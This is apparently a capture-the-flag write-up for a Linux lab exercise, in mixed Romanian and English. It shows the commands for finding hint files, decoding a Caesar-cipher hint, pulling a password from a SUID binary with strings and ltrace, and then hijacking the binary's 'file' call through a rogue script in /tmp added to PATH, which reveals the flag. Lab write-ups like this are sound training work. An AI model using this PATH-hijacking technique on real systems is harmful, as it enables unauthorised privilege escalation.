# Linux-ACL

Pentru mai multe cuvinte uita-te in redme-ul din `/sol`
## Pasi

```bash
find -name "*flag*"
# /var/local/vim/scripts/jmkr/flag1999
```

```bash
find / -name "*hint*"
cat /var/lib/misc/here/.hints.txt
# Here's more hints:

#   - Gandalf giving you problems? try the magic words `ltrace`...
#   - `find` is your friend (helped you find this);
#   - 16iyemkx 19aypjr 23vxlg 17krwjarnb 12kwhv 18XIBP 22zevmefpiw!
```

Al treilea hint e cifrul lui cezar cu complementul fata de 26 => you can trick suid binaries with PATH variables!

```bash
find / -name "*manele*" 2>/dev/null
# /usr/games/hunt/manele
# /var/local/trap/manele
```
```bash
cd /usr/games/hunt/manele
./ x31337.bin
# You shall not pass!
```
```bash
strings ./x31337.bin
# ...
# 7a0ba3fe73fcac4a382dc6d38163c98a
# You shall not pass!
# Ok, I'll show you a magic trick:
# /var/local/vim/scripts/jmkr/flag1999
# file "%s"
# ...
```
```bash
ltrace ./x31337.bin 7a0ba3fe73fcac4a382dc6d38163c98a
```

```bash
nano /tmp/file
# cat /var/local/vim/scripts/jmkr/flag1999
chmod +x /tmp/file
export PATH=/tmp:$PATH
```
```bash
/usr/games/hunt/manele/x31337.bin 7a0ba3fe73fcac4a382dc6d38163c98a
# Ok, I'll show you a magic trick:
# SpeishFlag{1KSovYqFbaF60mrlw5gX40Ck45xpHqQr}
```
